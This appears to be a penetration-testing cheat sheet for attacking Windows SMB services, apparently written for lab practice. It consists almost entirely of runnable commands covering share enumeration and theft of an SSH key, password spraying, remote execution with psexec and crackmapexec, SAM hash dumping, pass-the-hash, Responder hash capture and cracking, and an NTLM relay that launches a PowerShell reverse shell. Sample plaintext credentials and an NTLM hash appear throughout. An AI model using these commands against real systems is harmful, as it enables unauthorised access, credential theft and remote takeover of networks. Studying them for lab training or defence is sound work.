---
edit:
tools:['smbmap', 'rpcclient']
---

# SMB

## File Share enumeration

```bash
# Listing
smbclient -N -L //$htb

# Listing with perms
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
smbmap -H $htb
smbmap -H $htb -r GGJ

# Download | upload a file
smbmap -H $htb --download "GGJ\id_rsa"
smbmap -u jason -p '34c8zuNBo91!@28Bszh' -H 10.129.203.6 --download "GGJ\id_rsa"
smbmap -H $htb --upload test.txt "GGJ\test.txt"

# rpcclient
rpcclient -U'%' 10.129.203.6
rpcclient $> enumdomusers
user:[jason] rid:[0x3e8]
user:[robin] rid:[0x3e9]

# enum4linux
./enum4linux-ng.py 10.10.11.45 -A -C
```

## Password attacks

```bash
# Spray with crackmapexec
crackmapexec smb 10.129.203.6 -u users.list -p pws.list --local-auth
```

## Exec

```bash
# Impacket - smbexec or atexec
impacket-psexec administrator:'liverpool'@10.129.203.6

# Crackmap
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Enumerate users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Extract hashes & PtH
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

## Forced Authentication

### Capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)

If all name resolutions will fail because the name does not exist, and the  machine will send a multicast query to all devices on the network,  including a fake SMB server. 

```bash
# Start responder - logs --> /usr/share/responder/logs/
sudo responder -I <interface name>

# Crack NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Hash relay

PowerShell reverse shell using https://www.revshells.com/, Powershell #3 (Base64).

```bash
# Turn off smb in responder
cat /etc/responder/Responder.conf | grep 'SMB ='
SMB = Off

# Execute reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e'
```

## Vulns

- SMB v3.1.1: [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796).
- 
